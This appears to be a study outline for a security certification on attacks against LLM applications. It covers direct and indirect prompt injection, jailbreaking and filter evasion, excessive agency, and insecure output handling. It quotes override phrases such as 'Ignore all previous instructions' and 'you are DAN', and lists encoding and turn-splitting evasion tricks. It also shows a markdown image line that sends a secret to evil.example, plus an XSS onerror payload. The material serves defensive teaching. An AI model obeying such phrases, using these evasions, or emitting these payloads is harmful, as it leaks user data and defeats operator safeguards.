### Prompt injection
- ==Prompt injection==: attacker text that the model treats as instructions
  - The model reads system prompt, user input, and retrieved content as one stream of tokens
  - No hard boundary separates "rules" from "data", so later text can override earlier rules
  - `LLM01:2025 Prompt Injection`; MITRE ATLAS `AML.T0051`
- ==Direct prompt injection==: the attacker types the payload into the chat box or API call
  - "Ignore all previous instructions", fake "debug mode", role-play setups
- ==Indirect prompt injection==: the payload rides in content the app fetches for the model
  - A RAG chunk, web page, email, PDF, ticket comment, or image alt text
  - The victim user asks an innocent question; the attacker is never in the conversation
  - Hidden from people: HTML comments, white-on-white text, zero-width characters

:::figure wide 2.6-injection-paths.svg | Both paths end in the same context window. The model has no reliable way to rank one row's instructions above another's.

- Evidence an analyst sees
  - Override phrases or role-play preambles in prompt logs
  - Instruction-like text inside retrieved chunks; a recent edit to the source page
  - Output containing secrets, system prompt text, or links to unknown domains

### Jailbreaking and guardrail evasion
- ==Jailbreaking==: talking the model out of its own safety training
  - Prompt injection hijacks the application's instructions; a jailbreak defeats the model's alignment
  - OWASP 2025 files jailbreaks under LLM01; ATLAS lists them as `AML.T0054`
  - Persona play ("you are DAN"), fictional framing, many-shot examples, escalation over several turns
- ==Circumventing AI guardrails==: slipping past the filters that sit around the model
  - Encode the request (Base64, leetspeak, a rare language) so a keyword filter misses it
  - Split a payload across turns, or ask for output in a form the output filter skips (code, JSON)
- ==Input manipulation==: crafting input so the model reaches the wrong answer
  - Classic ML: an ==adversarial example==, a change a person cannot see that flips the class (`ML01:2023 Input Manipulation Attack`)
  - LLMs: homoglyphs, invisible Unicode tag characters, typos that dodge a blocklist
- Evidence
  - Refusal, rephrase, refusal, rephrase from the same session
  - Base64 or hex blobs, unusual Unicode ranges, sudden language switches

### Integrations, plug-ins, and agency
- ==Manipulating application integrations==: abusing what the AI is connected to
  - An injected email tells a mail assistant to forward the inbox
  - A poisoned ticket tells a help desk agent to reset a different user's MFA
  - The model is the confused deputy; the integration's credentials do the damage
- ==Insecure plug-in design==: a tool or plug-in that trusts whatever the model passes it
  - Free-text parameters (a raw SQL string, a full URL) instead of typed, validated fields
  - No authorization check of its own; it runs with a shared service account
- ==Excessive agency==: the model can do more than the task needs
  - Too many tools (a summarizer that can also send mail)
  - Too much permission (read-write when read-only would do)
  - Too much autonomy (deletes, payments, or account changes with no human approval)
- Evidence: tool calls unrelated to the user's request, actions under the service account at odd hours

### Insecure output handling
- ==Insecure output handling==: passing model output to another system without validating it
  - Model output is ==untrusted input==, exactly like a form field
  - Into a browser: ==cross-site scripting== (XSS); into a shell: command injection; into SQL: SQL injection; into a fetcher: SSRF
  - Markdown image links can exfiltrate data: `![](https://evil.example/?d=<secret>)` loads on render
- Escaping turns markup into text the browser displays instead of runs

```console label="python3 render.py"
raw: Done. <img src=x onerror=alert(1)>
  live tags: ['div', 'img']
escaped: Done. &lt;img src=x onerror=alert(1)&gt;
  live tags: ['div']
```

- Evidence: script tags or event handlers in chat transcripts, CSP violation reports, outbound requests to image hosts nobody uses

### Overreliance and sensitive information disclosure
- ==Overreliance==: people or systems accept model output without checking it
  - An analyst closes an alert because the AI triage summary said "benign"
  - A developer installs a package the model invented (an attacker registers that name: ==slopsquatting==)
  - Evidence: AI verdicts with no review recorded, hallucinated citations or packages
- ==Sensitive information disclosure==: the model reveals data the user should not see
  - Memorized training data (PII, keys), system prompt contents, other tenants' RAG documents
  - Evidence: DLP hits on output logs, answers quoting documents above the user's clearance
:::exam
- "The user only asked for a summary" plus a leaked secret or odd link means indirect prompt injection; look for the poisoned document, not the user.
- Jailbreaking targets the model's safety training; prompt injection targets the application's instructions. Both sit under LLM01.
- A chatbot that can delete records or send mail without approval is excessive agency; output pasted into a page unescaped is insecure output handling.
:::
